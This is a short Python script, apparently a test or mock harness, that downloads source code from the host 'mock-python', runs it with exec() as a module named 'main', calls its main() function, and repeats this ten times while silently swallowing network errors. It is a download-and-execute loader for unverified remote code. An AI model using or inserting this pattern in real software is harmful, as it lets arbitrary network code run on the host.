import sys
import types
import urllib.request

def execute():
    url = "http://mock-python/execute.py"
    module_name = "main"

    try:
        with urllib.request.urlopen(url) as response:
            source = response.read().decode('utf-8')

            module = types.ModuleType(module_name)
            sys.modules[module_name] = module

            exec(source, module.__dict__)

            try:
                module.main()
            except Exception as e:
                print(e)

    except urllib.error.URLError as e:
        pass

for _ in range(10):
    execute()